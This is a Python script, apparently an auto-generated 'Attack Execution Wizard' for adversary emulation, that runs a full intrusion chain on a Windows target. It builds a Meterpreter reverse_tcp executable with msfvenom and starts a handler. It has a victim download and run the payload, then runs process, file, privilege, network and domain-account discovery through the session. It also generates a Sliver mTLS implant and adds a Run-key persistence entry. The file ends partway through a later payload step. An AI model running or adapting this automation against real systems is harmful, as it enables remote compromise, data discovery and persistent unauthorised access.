
import asyncio
import time
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
_execution_timestamps = []
def log_command_execution():
    ts = time.time_ns()
    _execution_timestamps.append(ts)
    console.print(f"[bold yellow][Command execution at] " + str(ts) + "[/]")
    console.print(f"[bold yellow][All timestamps] " + str(_execution_timestamps) + "[/]")
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")

    pddl_parameters = {}

    # Dictionary to track executors and their relationships
    # Each executor has: type, isDerivedExecutor, RealSessionID, parentExecutor
    executor_dict = {}

    console.print(f"[bold cyan]\n📌[MSFVenom Console] Step 1[/]")
    console.print(f"[bold cyan]\n📌[Name] Build the executable file of a Meterpreter session (for Windows) using MSFVenom[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the generated payload")

    if "string0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string0"]))
        user_params["SAVE_PATH"] = pddl_parameters["string0"]
    else:
        default_val = None
        required_val = False
        user_input = console.input(
            f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and False:
            raise ValueError("Missing required parameter: SAVE_PATH")
        user_params["SAVE_PATH"] = user_input
        pddl_parameters["string0"] = user_input

    confirm_action()

    # Step 1: Generate payload with msfvenom
    console.print(f"[bold cyan]\n[MSFVenom Console] Generating payload...[/]")
    msfvenom_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={user_params["LHOST"]} LPORT={user_params["LPORT"]} -f exe -o {user_params["SAVE_PATH"]}"
    import subprocess
    log_command_execution()
    try:
        result = subprocess.run(
            msfvenom_command,
            shell=True,
            capture_output=True,
            check=True
        )
        console.print(f"[bold green]✓ Payload generated successfully[/]")
        if result.stderr:
            stderr_output = result.stderr.decode('utf-8', errors='ignore')
            console.print(stderr_output)
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]✗ MSFVenom command failed: {str(e)}[/]")
        if e.stderr:
            stderr_output = e.stderr.decode('utf-8', errors='ignore')
            console.print(f"[red]{stderr_output}[/]")
        raise

    from attack_executor.exploit.Metasploit import MetasploitExecutor
    metasploit_executor = MetasploitExecutor(config=config)

    # Step 2: Start Metasploit handler (windows/meterpreter/reverse_tcp)
    console.print(f"[bold cyan]\n[MSFVenom Console] Starting Metasploit handler (windows/meterpreter/reverse_tcp)...[/]")
    log_command_execution()
    with console.status("[bold green]Starting Metasploit handler..."):
        metasploit_executor.exploit_and_execute_payload(
            exploit_module_name="exploit/multi/handler",
            payload_module_name="windows/meterpreter/reverse_tcp",
            LHOST=user_params["LHOST"],
            LPORT=user_params["LPORT"]
        )
    console.print("[bold green]✓ Handler started - waiting for victim to connect[/]")
    print_finished_message("Payload generated and Metasploit handler started successfully!😊")

    console.print(f"[bold cyan]\n📌[Human] Step 2[/]")
    console.print(f"[bold cyan]\n📌[Name] Simulate the victim download and execute malicious payload file[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the http file server (typically the attacker machine)")

    default_val = None
    required_val = False
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: port of the http file server")

    default_val = 8000
    required_val = False
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the downloaded payload")

    if "string1" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string1"]))
        user_params["SAVE_PATH"] = pddl_parameters["string1"]
    else:
        default_val = None
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: SAVE_PATH")
        user_params["SAVE_PATH"] = user_input
        pddl_parameters["string1"] = user_input

    # Map PATH to already collected SAVE_PATH
    user_params["PATH"] = user_params["SAVE_PATH"]
    console.print(f"""\
    (This step needs human interaction and (temporarily) cannot be executed automatically)
    (On attacker's machine)
    python -m http.server {user_params["LPORT"]}

    (On victim's machine)
    1. Open {user_params["LHOST"]}:8000 in the browser
    2. Navigate to the path of the target payload file
    3. Download the payload file
    4. Execute the payload file to {user_params["PATH"]} (If on a Linux machine, you also need to chmod the file)

    """)

    confirm_action()

    console.print(f"[bold cyan]\n📌[None] Step 3[/]")
    console.print(f"[bold cyan]\n📌[Name] Execute a Meterpreter Payload[/]")


    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 4[/]")
    console.print(f"[bold cyan]\n📌[Name] List Processes[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: ps[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.ps(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 5[/]")
    console.print(f"[bold cyan]\n📌[Name] Read File Content[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 5 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: FilePath[/]")
    console.print(f"  Description: Full path to the target file on remote system")
    default_val = ""
    required_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for FilePath (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: FilePath")
    user_params["FilePath"] = user_input

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: cat[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.cat("'" + str(user_params["FilePath"]) + "'", str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 6[/]")
    console.print(f"[bold cyan]\n📌[Name] File Search[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Pattern[/]")
    console.print(f"  Description: File search pattern (e.g., *.txt)")
    default_val = ""
    required_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for Pattern (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: Pattern")
    user_params["Pattern"] = user_input

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: search[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.search("'" + str(user_params["Pattern"]) + "'", str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 7[/]")
    console.print(f"[bold cyan]\n📌[Name] Get Active Desktop[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: getdesktop[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.getdesktop(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 8[/]")
    console.print(f"[bold cyan]\n📌[Name] List Network Interfaces (Windows)[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: ipconfig[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.ipconfig(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 9[/]")
    console.print(f"[bold cyan]\n📌[Name] ARP Cache Inspection[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: arp[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.arp(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 10[/]")
    console.print(f"[bold cyan]\n📌[Name] Discovery[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: getprivs[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.getprivs(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 11[/]")
    console.print(f"[bold cyan]\n📌[Name] Interactive Shell Access (Windows)[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: ParentExecutorID[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    # Parent executor for this step is the current Meterpreter session
    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["ParentExecutorID"] = pddl_parameters["executor0"]
    else:
        pddl_parameters["executor0"] = metasploit_sessionid
        user_params["ParentExecutorID"] = metasploit_sessionid
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": metasploit_sessionid,
            "parentExecutor": None
        }

    # DerivedExecutorID (executor4): Derived executor - implicit in the command execution
    # Description: 
    # Register as derived executor with parent: executor0
    # Get parent's session ID for the derived executor
    if "executor0" != "None" and "executor0" in executor_dict:
        parent_session_id = executor_dict["executor0"]["RealSessionID"]
        pddl_parameters["executor4"] = parent_session_id
    else:
        parent_session_id = user_params.get("SessionID", user_params.get("meterpreter_sessionid", ""))
        pddl_parameters["executor4"] = parent_session_id

    executor_dict["executor4"] = {
        "type": None,  # Type determined by command execution
        "isDerivedExecutor": True,
        "RealSessionID": parent_session_id,  # Use parent's session ID
        "parentExecutor": "executor0" if "executor0" != "None" else None
    }

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: shell[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.shell(executor_dict["executor0"]["RealSessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Command Prompt Executor] Step 12[/]")
    console.print(f"[bold cyan]\n📌[Name] Enumerate all accounts (Domain)[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The executor for this action")

    if "executor4" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor4"]))
        user_params["Executor"] = pddl_parameters["executor4"]
    else:
        default_val = ''
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for Executor (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: Executor")
        user_params["Executor"] = user_input
        pddl_parameters["executor4"] = user_input

    confirm_action()
    commands = f"""
    net user /domain
    net group /domain
    """
    log_command_execution()
    metasploit_executor.communicate_with_msf_session(input_texts=commands, session_id=executor_dict["executor4"]["RealSessionID"])

    print_finished_message()

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 13[/]")
    console.print(f"[bold cyan]\n📌[Name] Print Working Directory[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: pwd[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.pwd(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 14[/]")
    console.print(f"[bold cyan]\n📌[Name] Get Security Identifier[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: getsid[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.getsid(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Sliver Console] Step 15[/]")
    console.print(f"[bold cyan]\n📌[Name] Build the executable file of a Sliver implant (for Windows)[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the generated payload")

    if "string3" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string3"]))
        user_params["SAVE_PATH"] = pddl_parameters["string3"]
    else:
        default_val = None
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: SAVE_PATH")
        user_params["SAVE_PATH"] = user_input
        pddl_parameters["string3"] = user_input

    # Execute in Sliver Console
    console.print(f"[bold green][MANUAL ACTION REQUIRED][/bold green]")
    console.print(f"""\
    sliver > generate --mtls {user_params["LHOST"]}:{user_params["LPORT"]} --os windows --arch 64bit --format exe --save {user_params["SAVE_PATH"]}
    sliver > mtls --lport {user_params["LPORT"]}

    """)

    confirm_action()

    console.print(f"[bold cyan]\n📌[Human] Step 16[/]")
    console.print(f"[bold cyan]\n📌[Name] Simulate the victim download a file on its machine[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the http file server (typically the attacker machine)")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: port of the http file server")

    default_val = 8000
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the downloaded payload")

    if "string4" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string4"]))
        user_params["SAVE_PATH"] = pddl_parameters["string4"]
    else:
        default_val = None
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: SAVE_PATH")
        user_params["SAVE_PATH"] = user_input
        pddl_parameters["string4"] = user_input

    # Map PATH to already collected SAVE_PATH
    user_params["PATH"] = user_params["SAVE_PATH"]
    console.print(f"""\
    (This step needs human interaction and (temporarily) cannot be executed automatically)
    (On attacker's machine)
    python -m http.server {user_params["LPORT"]}

    (On victim's machine)
    1. Open {user_params["LHOST"]}:{user_params["LPORT"]} in the browser
    2. Navigate to the path of the file on the attacker's machine
    3. Download the file to {user_params["PATH"]}

    """)

    confirm_action()

    console.print(f"[bold cyan]\n📌[Command Prompt Executor] Step 17[/]")
    console.print(f"[bold cyan]\n📌[Name] Reg Key Run[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The executor for this action")

    if "executor4" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor4"]))
        user_params["Executor"] = pddl_parameters["executor4"]
    else:
        default_val = ''
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for Executor (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: Executor")
        user_params["Executor"] = user_input
        pddl_parameters["executor4"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: command_to_execute[/]")
    console.print(f"  Description: Thing to Run")

    if "string4" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string4"]))
        user_params["command_to_execute"] = pddl_parameters["string4"]
    else:
        default_val = 'C:\\Path\\AtomicRedTeam.exe'
        required_val = False
        user_input = console.input(
            f"[bold]➤ Enter value for command_to_execute (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and False:
            raise ValueError("Missing required parameter: command_to_execute")
        user_params["command_to_execute"] = user_input
        pddl_parameters["string4"] = user_input

    confirm_action()
    commands = f"""
    REG ADD \"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"{user_params['command_to_execute']}\"
    """
    log_command_execution()
    metasploit_executor.communicate_with_msf_session(input_texts=commands, session_id=executor_dict["executor4"]["RealSessionID"])

    print_finished_message()

    console.print(f"[bold cyan]\n📌[None] Step 18[/]")
    console.print(f"[bold cyan]\n📌[Name] Obtain a persistent Sliver Executor[/]")


    console.print(f"[bold cyan]\n📌[Human] Step 19[/]")
    console.print(f"[bold cyan]\n📌[Name] Simulate the victim download and execute malicious payload file as Admin (Root)[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: HOST[/]")
    console.print(f"  Description: IP address of the http file server (typically the attacker machine)")

    default_val = None
    required_val = False
    user_input = console.input(
        f"[bold]➤ Enter value for HOST (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: HOST")
    user_params["HOST"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: port of the http file server")

    default_val = 8000
    required_val = False
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the downloaded payload")

    if "string2" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string2"]))
        user_params["SAVE_PATH"] = pddl_parameters["string2"]
    else:
        default_val = None
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: SAVE_PATH")
